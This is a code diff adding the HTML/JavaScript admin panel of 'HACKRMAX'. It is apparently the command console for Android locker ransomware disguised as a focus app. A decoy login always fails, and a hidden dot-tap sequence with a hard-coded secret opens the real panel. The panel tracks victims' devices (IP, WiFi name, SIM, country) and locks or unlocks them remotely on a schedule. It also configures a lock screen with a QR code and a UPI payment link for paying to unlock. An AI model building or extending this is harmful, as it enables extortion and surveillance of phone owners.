@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>HACKRMAX</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#08080f;--bg2:#0f0f1a;--bg3:#13131f;
+  --border:#1e1e30;--accent:#ff3366;
+  --green:#00e676;--text:#fff;--sub:#666;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;min-height:100vh}
+
+/* FAKE LOGIN */
+#fake-login{
+  position:fixed;inset:0;background:var(--bg);
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:center;z-index:9999;
+}
+.login-box{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:20px;padding:40px 32px;width:340px;
+  box-shadow:0 20px 60px rgba(0,0,0,.5);
+}
+.login-logo{font-size:24px;font-weight:800;letter-spacing:4px;
+  text-align:center;margin-bottom:6px}
+.login-logo span{color:var(--accent)}
+.login-sub{font-size:11px;color:var(--sub);text-align:center;
+  letter-spacing:2px;margin-bottom:32px}
+.login-input{width:100%;background:var(--bg3);border:1px solid var(--border);
+  border-radius:10px;padding:14px 16px;color:#fff;font-size:15px;margin-bottom:14px}
+.login-input:focus{outline:none;border-color:var(--accent)}
+.login-btn{width:100%;background:var(--accent);border:none;
+  border-radius:10px;padding:14px;color:#fff;font-size:14px;
+  font-weight:700;letter-spacing:2px;cursor:pointer;margin-bottom:16px}
+.login-err{font-size:12px;color:var(--accent);text-align:center;
+  min-height:18px;letter-spacing:1px}
+
+/* SECRET 3 DOTS */
+.dots-bar{
+  position:fixed;top:0;left:0;right:0;height:44px;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 24px;z-index:10000;pointer-events:none;
+}
+.dot-tap{
+  width:44px;height:44px;display:flex;align-items:center;
+  justify-content:center;cursor:pointer;pointer-events:all;
+  border-radius:50%;transition:.15s;
+}
+.dot-tap:active{background:rgba(255,255,255,.05)}
+.dot-inner{
+  width:8px;height:8px;border-radius:50%;
+  background:rgba(255,255,255,.15);transition:.3s;
+}
+.dot-inner.hit{background:var(--accent);box-shadow:0 0 8px var(--accent)}
+
+/* MAIN ADMIN */
+#admin-panel{display:none}
+.header{
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  padding:14px 24px;display:flex;align-items:center;
+  justify-content:space-between;position:sticky;top:0;z-index:100;
+}
+.logo{font-size:18px;font-weight:800;letter-spacing:3px}
+.logo span{color:var(--accent)}
+.stats{display:flex;gap:12px}
+.stat{
+  background:var(--bg3);border:1px solid var(--border);
+  padding:6px 14px;border-radius:8px;text-align:center;min-width:70px;
+}
+.stat-n{font-size:20px;font-weight:700;color:var(--accent)}
+.stat-l{font-size:9px;color:var(--sub);letter-spacing:1px}
+.tabs{
+  display:flex;background:var(--bg2);
+  border-bottom:1px solid var(--border);
+}
+.tab{
+  padding:13px 24px;cursor:pointer;font-size:12px;letter-spacing:1px;
+  color:var(--sub);border-bottom:2px solid transparent;transition:.2s;
+}
+.tab.on{color:#fff;border-bottom-color:var(--accent)}
+.page{display:none;padding:20px;max-width:1100px;margin:0 auto}
+.page.on{display:block}
+
+/* DEVICES */
+.search{
+  width:100%;background:var(--bg2);border:1px solid var(--border);
+  border-radius:10px;padding:10px 16px;color:#fff;
+  font-size:13px;margin-bottom:16px;
+}
+.search:focus{outline:none;border-color:var(--accent)}
+.card{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:12px;padding:16px;margin-bottom:10px;
+  display:flex;align-items:center;gap:14px;
+  cursor:pointer;transition:.2s;
+}
+.card:hover{border-color:#2a2a40;background:var(--bg3)}
+.odot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.odot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
+.odot.off{background:#333}
+.ci{flex:1;min-width:0}
+.cn{font-weight:700;font-size:14px;margin-bottom:3px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cm{font-size:11px;color:var(--sub);display:flex;gap:10px;flex-wrap:wrap}
+.badge{
+  padding:3px 10px;border-radius:20px;font-size:11px;
+  font-weight:600;flex-shrink:0;
+}
+.badge.lk{background:rgba(255,51,102,.15);color:var(--accent);
+  border:1px solid rgba(255,51,102,.3)}
+.badge.ul{background:rgba(0,230,118,.1);color:var(--green);
+  border:1px solid rgba(0,230,118,.2)}
+.tgl{position:relative;width:48px;height:26px;flex-shrink:0}
+.tgl input{opacity:0;width:0;height:0}
+.tsl{
+  position:absolute;inset:0;background:#222;
+  border-radius:26px;transition:.25s;cursor:pointer;
+}
+.tsl::before{
+  content:'';position:absolute;height:18px;width:18px;
+  left:4px;bottom:4px;background:#555;
+  border-radius:50%;transition:.25s;
+}
+input:checked+.tsl{
+  background:rgba(255,51,102,.25);
+  border:1px solid var(--accent);
+}
+input:checked+.tsl::before{
+  transform:translateX(22px);background:var(--accent);
+}
+
+/* DETAIL */
+.det{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:12px;padding:20px;margin-bottom:16px;
+  display:none;
+}
+.det.on{display:block}
+.det-head{
+  display:flex;align-items:center;gap:12px;
+  padding-bottom:14px;margin-bottom:16px;
+  border-bottom:1px solid var(--border);
+}
+.back{
+  background:var(--bg3);border:1px solid var(--border);
+  color:#fff;padding:7px 14px;border-radius:8px;
+  cursor:pointer;font-size:12px;
+}
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
+  gap:10px;margin-bottom:16px;
+}
+.gi{background:var(--bg3);border-radius:8px;padding:10px 12px}
+.gl{font-size:9px;color:var(--sub);letter-spacing:1px;
+  margin-bottom:3px;text-transform:uppercase}
+.gv{font-size:13px;font-weight:600}
+.gv.on{color:var(--green)}
+.gv.off{color:var(--accent)}
+.sched{
+  background:var(--bg3);border-radius:10px;padding:14px;margin-top:12px;
+}
+.sched h4{font-size:11px;color:var(--sub);letter-spacing:1px;margin-bottom:10px}
+.srow{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.sinput{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:8px;padding:8px 12px;color:#fff;font-size:13px;
+}
+.btn{
+  padding:9px 18px;border:none;border-radius:8px;
+  cursor:pointer;font-size:12px;font-weight:700;
+  letter-spacing:1px;transition:.15s;
+}
+.btn-r{background:var(--accent);color:#fff}
+.btn-r:hover{background:#e0294f}
+.btn-g{background:var(--bg2);color:var(--sub);border:1px solid var(--border)}
+.ti{font-size:11px;color:var(--accent);margin-top:6px}
+
+/* SETTINGS */
+.scard{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:12px;padding:20px;margin-bottom:14px;
+}
+.scard h3{font-size:11px;color:var(--sub);letter-spacing:2px;
+  margin-bottom:16px;text-transform:uppercase}
+.fg{margin-bottom:14px}
+.fl{font-size:10px;color:var(--sub);letter-spacing:1px;
+  margin-bottom:5px;display:block;text-transform:uppercase}
+.fi{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  border-radius:8px;padding:11px 14px;color:#fff;font-size:13px;
+}
+.fi:focus{outline:none;border-color:var(--accent)}
+.save-btn{
+  width:100%;background:var(--accent);border:none;
+  border-radius:8px;padding:13px;font-size:14px;
+  font-weight:700;letter-spacing:2px;color:#fff;cursor:pointer;
+  margin-top:6px;
+}
+.dl-btn{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  border-radius:8px;padding:13px;font-size:13px;
+  font-weight:600;color:#fff;cursor:pointer;margin-top:10px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.no-dev{
+  text-align:center;padding:60px;color:var(--sub);font-size:13px;
+}
+/* TOAST */
+.toast{
+  position:fixed;bottom:20px;right:20px;
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:10px;padding:11px 18px;font-size:13px;
+  transform:translateY(80px);transition:.3s;z-index:9999;
+}
+.toast.show{transform:translateY(0)}
+.toast.ok{border-color:var(--green);color:var(--green)}
+.toast.err{border-color:var(--accent);color:var(--accent)}
+</style>
+</head>
+<body>
+
+<!-- SECRET DOTS (always visible on top) -->
+<div class="dots-bar">
+  <div class="dot-tap" onclick="dotTap(0)"><div class="dot-inner" id="d0"></div></div>
+  <div class="dot-tap" onclick="dotTap(1)"><div class="dot-inner" id="d1"></div></div>
+  <div class="dot-tap" onclick="dotTap(2)"><div class="dot-inner" id="d2"></div></div>
+</div>
+
+<!-- FAKE LOGIN -->
+<div id="fake-login">
+  <div class="login-box">
+    <div class="login-logo">HACKR<span>MAX</span></div>
+    <div class="login-sub">ADMIN PANEL</div>
+    <input class="login-input" type="password" placeholder="Enter Password"
+           id="fake-pass" onkeydown="if(event.key==='Enter')fakeLogin()"/>
+    <button class="login-btn" onclick="fakeLogin()">LOGIN</button>
+    <div class="login-err" id="lerr"></div>
+    <div style="font-size:10px;color:#333;text-align:center;margin-top:8px">
+      v1.0 • hackrmaxapp.up.railway.app
+    </div>
+  </div>
+</div>
+
+<!-- REAL ADMIN PANEL -->
+<div id="admin-panel">
+  <div class="header">
+    <div class="logo">HACKR<span>MAX</span></div>
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-n" id="st">0</div>
+        <div class="stat-l">TOTAL</div>
+      </div>
+      <div class="stat">
+        <div class="stat-n" id="so">0</div>
+        <div class="stat-l">ONLINE</div>
+      </div>
+      <div class="stat">
+        <div class="stat-n" id="sl">0</div>
+        <div class="stat-l">LOCKED</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab on" onclick="showTab('dev',this)">📱 DEVICES</div>
+    <div class="tab" onclick="showTab('set',this)">⚙️ SETTINGS</div>
+  </div>
+
+  <!-- DEVICES PAGE -->
+  <div class="page on" id="p-dev">
+    <input class="search" type="text" placeholder="🔍 Search devices..."
+           oninput="filterDev(this.value)"/>
+    <div class="det" id="det-panel"></div>
+    <div id="dev-list"></div>
+  </div>
+
+  <!-- SETTINGS PAGE -->
+  <div class="page" id="p-set">
+    <div class="scard">
+      <h3>🎨 Display Settings</h3>
+      <div class="fg"><label class="fl">Title</label>
+        <input class="fi" id="s-title" placeholder="Stay Focused!"/></div>
+      <div class="fg"><label class="fl">Subtitle</label>
+        <input class="fi" id="s-sub" placeholder="Deep work mode active"/></div>
+      <div class="fg"><label class="fl">QR Code Image URL</label>
+        <input class="fi" id="s-qr" placeholder="https://...image.png"/></div>
+    </div>
+    <div class="scard">
+      <h3>🔘 Buttons</h3>
+      <div class="fg"><label class="fl">Unlock Button Text</label>
+        <input class="fi" id="s-b1" placeholder="UNLOCK"/></div>
+      <div class="fg"><label class="fl">Emergency Button Text</label>
+        <input class="fi" id="s-b2" placeholder="Emergency UPI"/></div>
+      <div class="fg"><label class="fl">Emergency Button URL</label>
+        <input class="fi" id="s-b2u" placeholder="upi://pay?pa=..."/></div>
+      <button class="save-btn" onclick="saveSettings()">💾 SAVE ALL</button>
+    </div>
+    <div class="scard">
+      <h3>📦 Backup</h3>
+      <button class="dl-btn" onclick="window.location='/admin/download'">
+        📥 Download Full Backup
+      </button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ─── SECRET DOT LOGIC ───
+const DOT_TIMEOUT = 10000; // 10 seconds
+let dotSeq = [];
+let dotTimer = null;
+
+function dotTap(idx) {
+  clearTimeout(dotTimer);
+  document.getElementById('d'+idx).classList.add('hit');
+  setTimeout(() => document.getElementById('d'+idx).classList.remove('hit'), 800);
+  
+  dotSeq.push(idx);
+  
+  // Check sequence: 0,1,2 in any order but all 3 within 10s
+  if (dotSeq.length === 3) {
+    const has0 = dotSeq.includes(0);
+    const has1 = dotSeq.includes(1);
+    const has2 = dotSeq.includes(2);
+    if (has0 && has1 && has2) {
+      dotSeq = [];
+      verifyDots();
+      return;
+    }
+    dotSeq = [];
+    return;
+  }
+  
+  dotTimer = setTimeout(() => {
+    dotSeq = [];
+  }, DOT_TIMEOUT);
+}
+
+async function verifyDots() {
+  try {
+    const r = await fetch('/auth', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({secret: 'dots_verified'})
+    });
+    const d = await r.json();
+    if (d.ok) unlockAdmin();
+  } catch(e) {}
+}
+
+function unlockAdmin() {
+  document.getElementById('fake-login').style.display = 'none';
+  document.getElementById('admin-panel').style.display = 'block';
+  loadData();
+}
+
+// Check if already authenticated
+function checkAuth() {
+  // Try to load data - if works, show admin
+  fetch('/admin/data')
+    .then(r => r.json())
+    .then(d => {
+      if (d.devices !== undefined) unlockAdmin();
+    })
+    .catch(() => {});
+}
+
+// Fake login - always fails
+function fakeLogin() {
+  const p = document.getElementById('fake-pass').value;
+  if (p.length > 0) {
+    document.getElementById('lerr').textContent = 'Incorrect password';
+    document.getElementById('fake-pass').value = '';
+    setTimeout(() => document.getElementById('lerr').textContent = '', 2000);
+  }
+}
+
+// ─── DATA ───
+let allDevs = {};
+let curDev = null;
+
+async function loadData() {
+  try {
+    const r = await fetch('/admin/data');
+    const d = await r.json();
+    if (d.error) return;
+    allDevs = d.devices || {};
+    loadSettings(d.settings || {});
+    updateStats();
+    renderDevices();
+  } catch(e) {}
+}
+
+function updateStats() {
+  const devs = Object.values(allDevs);
+  document.getElementById('st').textContent = devs.length;
+  document.getElementById('so').textContent = devs.filter(d=>d.online).length;
+  document.getElementById('sl').textContent = devs.filter(d=>d.locked).length;
+}
+
+function renderDevices(filter='') {
+  const list = document.getElementById('dev-list');
+  let devs = Object.values(allDevs);
+  if (filter) devs = devs.filter(d =>
+    (d.name||'').toLowerCase().includes(filter) ||
+    (d.model||'').toLowerCase().includes(filter) ||
+    (d.device_id||'').toLowerCase().includes(filter)
+  );
+  if (!devs.length) {
+    list.innerHTML = '<div class="no-dev">No devices found</div>';
+    return;
+  }
+  list.innerHTML = devs.map(dev => `
+    <div class="card" onclick="openDet('${dev.device_id}')">
+      <div class="odot ${dev.online?'on':'off'}"></div>
+      <div class="ci">
+        <div class="cn">${dev.name||dev.model||'Unknown'}</div>
+        <div class="cm">
+          <span>🆔 ${dev.device_id}</span>
+          <span>📱 ${dev.model||'-'}</span>
+          <span>🔋 ${dev.battery||'-'}%</span>
+          <span>📡 ${dev.network_type||'-'}</span>
+          <span>🕐 ${ago(dev.last_seen)}</span>
+        </div>
+      </div>
+      <span class="badge ${dev.locked?'lk':'ul'}">
+        ${dev.locked?'🔴 LOCKED':'🟢 UNLOCKED'}
+      </span>
+      <label class="tgl" onclick="event.stopPropagation()">
+        <input type="checkbox" ${dev.locked?'checked':''}
+               onchange="qToggle('${dev.device_id}',this.checked)"/>
+        <span class="tsl"></span>
+      </label>
+    </div>
+  `).join('');
+}
+
+function openDet(id) {
+  curDev = allDevs[id];
+  if (!curDev) return;
+  const panel = document.getElementById('det-panel');
+  panel.classList.add('on');
+  
+  const fields = [
+    ['Device ID', curDev.device_id],
+    ['Name', curDev.name||'-'],
+    ['Brand', curDev.brand||'-'],
+    ['Model', curDev.model||'-'],
+    ['Manufacturer', curDev.manufacturer||'-'],
+    ['Android', curDev.android_version||'-'],
+    ['SDK', curDev.sdk_version||'-'],
+    ['Battery', (curDev.battery||'-')+'%'],
+    ['Charging', curDev.battery_charging?'⚡ Yes':'No'],
+    ['Screen', (curDev.screen_width||'-')+'x'+(curDev.screen_height||'-')],
+    ['Density', curDev.screen_density||'-'],
+    ['RAM Total', curDev.ram_total||'-'],
+    ['RAM Free', curDev.ram_available||'-'],
+    ['Storage', curDev.storage_total||'-'],
+    ['Free', curDev.storage_free||'-'],
+    ['SIM', curDev.sim_operator||'-'],
+    ['Country', curDev.sim_country||'-'],
+    ['Network', curDev.network_type||'-'],
+    ['WiFi', curDev.wifi_ssid||'-'],
+    ['IP', curDev.ip_address||'-'],
+    ['Package', curDev.package_name||'-'],
+    ['Version', curDev.app_version||'-'],
+    ['Timezone', curDev.timezone||'-'],
+    ['Language', curDev.language||'-'],
+    ['Registered', curDev.registered_at||'-'],
+    ['Last Seen', curDev.last_seen||'-'],
+    ['Status', curDev.online?'Online':'Offline'],
+  ];
+
+  const timerVal = curDev.unlock_time ? 
+    curDev.unlock_time.replace(' ','T') : '';
+  
+  panel.innerHTML = `
+    <div class="det-head">
+      <button class="back" onclick="closeDet()">← Back</button>
+      <div>
+        <div style="font-size:16px;font-weight:700">${curDev.name||curDev.model||'Unknown'}</div>
+        <div style="font-size:11px;color:var(--sub)">ID: ${curDev.device_id}</div>
+      </div>
+      <div style="margin-left:auto;display:flex;align-items:center;gap:10px">
+        <span class="badge ${curDev.locked?'lk':'ul'}" id="det-badge">
+          ${curDev.locked?'🔴 LOCKED':'🟢 UNLOCKED'}
+        </span>
+        <label class="tgl">
+          <input type="checkbox" id="det-tog" ${curDev.locked?'checked':''}
+                 onchange="detToggle()"/>
+          <span class="tsl"></span>
+        </label>
+      </div>
+    </div>
+    <div class="grid">
+      ${fields.map(([l,v])=>`
+        <div class="gi">
+          <div class="gl">${l}</div>
+          <div class="gv ${v==='Online'?'on':v==='Offline'?'off':''}">${v}</div>
+        </div>
+      `).join('')}
+    </div>
+    <div class="sched">
+      <h4>⏰ SCHEDULE UNLOCK</h4>
+      <div class="srow">
+        <input type="datetime-local" class="sinput" id="sched-t" value="${timerVal}"/>
+        <button class="btn btn-r" onclick="setSched()">SET TIMER</button>
+        <button class="btn btn-g" onclick="clearSched()">CLEAR</button>
+      </div>
+      <div class="ti" id="ti-info">${timerVal ? '⏰ Timer active' : ''}</div>
+    </div>
+  `;
+  panel.scrollIntoView({behavior:'smooth'});
+}
+
+function closeDet() {
+  document.getElementById('det-panel').classList.remove('on');
+  document.getElementById('det-panel').innerHTML = '';
+  curDev = null;
+}
+
+async function detToggle() {
+  if (!curDev) return;
+  const locked = document.getElementById('det-tog').checked;
+  await doToggle(curDev.device_id, locked);
+}
+
+async function qToggle(id, locked) {
+  await doToggle(id, locked);
+}
+
+async function doToggle(id, locked) {
+  try {
+    const r = await fetch('/admin/toggle', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({device_id: id, locked: locked})
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast(locked ? '🔴 Device Locked' : '🟢 Device Unlocked',
+            locked ? 'err' : 'ok');
+      await loadData();
+      if (curDev && curDev.device_id === id) openDet(id);
+    } else toast('Error: ' + (d.error||''), 'err');
+  } catch(e) { toast('Network error','err'); }
+}
+
+async function setSched() {
+  if (!curDev) return;
+  const tv = document.getElementById('sched-t').value;
+  if (!tv) { toast('Select date & time','err'); return; }
+  const fmt = tv.replace('T',' ').substring(0,16);
+  try {
+    await fetch('/admin/schedule', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({device_id: curDev.device_id, unlock_time: fmt})
+    });
+    toast('⏰ Timer set!','ok');
+    document.getElementById('ti-info').textContent = '⏰ Timer active';
+  } catch(e) {}
+}
+
+async function clearSched() {
+  if (!curDev) return;
+  await fetch('/admin/schedule', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device_id: curDev.device_id, unlock_time: null})
+  });
+  document.getElementById('sched-t').value = '';
+  document.getElementById('ti-info').textContent = '';
+  toast('Timer cleared','ok');
+}
+
+function loadSettings(s) {
+  document.getElementById('s-title').value = s.title||'';
+  document.getElementById('s-sub').value = s.subtitle||'';
+  document.getElementById('s-qr').value = s.qr_url||'';
+  document.getElementById('s-b1').value = s.btn1_text||'';
+  document.getElementById('s-b2').value = s.btn2_text||'';
+  document.getElementById('s-b2u').value = s.btn2_url||'';
+}
+
+async function saveSettings() {
+  try {
+    const r = await fetch('/admin/settings', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        title: document.getElementById('s-title').value,
+        subtitle: document.getElementById('s-sub').value,
+        qr_url: document.getElementById('s-qr').value,
+        btn1_text: document.getElementById('s-b1').value,
+        btn2_text: document.getElementById('s-b2').value,
+        btn2_url: document.getElementById('s-b2u').value
+      })
+    });
+    const d = await r.json();
+    if (d.success) toast('✅ Saved!','ok');
+    else toast('Error','err');
+  } catch(e) { toast('Error','err'); }
+}
+
+function filterDev(v) { renderDevices(v.toLowerCase()); }
+
+function showTab(tab, el) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));
+  document.getElementById('p-'+tab).classList.add('on');
+  el.classList.add('on');
+}
+
+function toast(msg, type='ok') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  setTimeout(() => t.className = 'toast', 3000);
+}
+
+function ago(ds) {
+  if (!ds) return 'Never';
+  const diff = (new Date() - new Date(ds)) / 1000;
+  if (diff < 60) return Math.floor(diff)+'s ago';
+  if (diff < 3600) return Math.floor(diff/60)+'m ago';
+  if (diff < 86400) return Math.floor(diff/3600)+'h ago';
+  return Math.floor(diff/86400)+'d ago';
+}
+
+// Init
+checkAuth();
+setInterval(() => {
+  if (document.getElementById('admin-panel').style.display === 'block') {
+    loadData();
+  }
+}, 5000);
+</script>
+</body>
+</html>
